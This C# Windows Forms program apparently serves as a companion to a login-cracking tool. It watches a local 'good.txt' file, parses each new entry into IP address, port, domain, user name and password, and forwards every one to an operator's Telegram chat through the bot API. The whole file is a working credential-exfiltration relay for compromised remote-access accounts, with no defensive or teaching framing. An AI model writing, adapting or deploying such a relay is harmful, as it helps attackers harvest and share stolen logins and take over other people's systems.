using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        
        HttpClient client = new HttpClient();
        List<string> Sended = new List<string>();
        string TOken_BOT = "";
        long CHATID_USER = 0;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11;
            try
            {
                if (File.Exists("Data.txt"))
                {
                    string[] Data = File.ReadAllLines("Data.txt");
                    textBox1.Text = Data[0];
                    numericUpDown1.Value = Convert.ToInt64(Data[1]);

                }
            }
            catch { }
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            File.WriteAllLines("Data.txt", new string[] { textBox1.Text, numericUpDown1.Value.ToString() });
            CHATID_USER = Convert.ToInt64(numericUpDown1.Value);
            TOken_BOT = textBox1.Text;
            label3.ForeColor = Color.Orange;
            label3.Text = "Please Wait....";
            if(await BOTName())
            {
                button1.Enabled = false;
                await RUN();
            }
            else
            {
                label3.ForeColor = Color.Red;
                label3.Text = "Error";
            }
            
        }


        async Task RUN()
        {
            label3.ForeColor = Color.Green;
            await SendTelegramMessage("BOT Connected!");
            while (true)
            {
                if (File.Exists("good.txt"))
                {
                    string[] FileGood = File.ReadAllLines("good.txt");
                    foreach (var n in FileGood)
                    {
                        if (!Sended.Exists(x => x == n))
                        {
                            Sended.Add(n);
                            var Temp = Regex.Match(n, @"^(.*?):(.*?)@(.*?)\\(.*?);(.*)").Groups;
                            string MessageTelegram = $"🌐 IP Address: {Temp[1].Value}\r\n💠 PORT: {Temp[2].Value}\r\n⚔️ Domain: {Temp[3].Value}\r\n👤 USER: {Temp[4].Value}\r\n♨️ PASSWORD: {Temp[5].Value}";
                            await SendTelegramMessage(MessageTelegram);
                        }
                    }
                }
                await Task.Delay(2000);
            }
        }

        async Task SendTelegramMessage(string messageText)
        {
            var sendMessageUrl = $"https://api.telegram.org/bot{TOken_BOT}/sendMessage";
            var content = new FormUrlEncodedContent(new[]
            {
            new KeyValuePair<string, string>("chat_id", CHATID_USER.ToString()),
            new KeyValuePair<string, string>("text", messageText)
            });

            await client.PostAsync(sendMessageUrl, content);
        }

        async Task<bool> BOTName()
        {
            try
            {

                string apiUrl = $"https://api.telegram.org/bot{TOken_BOT}/getMe";
                string INFO = await client.GetStringAsync(apiUrl);
                label3.Text = $"Connected({Regex.Match(INFO, "\"username\":\"(.*?)\"").Groups[1].Value})!";
                return true;
            }
            catch (Exception Ex) { MessageBox.Show($"Error: {Ex.Message}","Error",MessageBoxButtons.OK,MessageBoxIcon.Error); return false; }
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if(this.WindowState== FormWindowState.Normal||this.WindowState == FormWindowState.Maximized)
            {
                this.WindowState = FormWindowState.Minimized;
                this.Hide();
            }
            else //if(this.WindowState==FormWindowState.Minimized)
            {
                this.Show();
                this.WindowState = FormWindowState.Normal;
                
            }
        }
    }
}
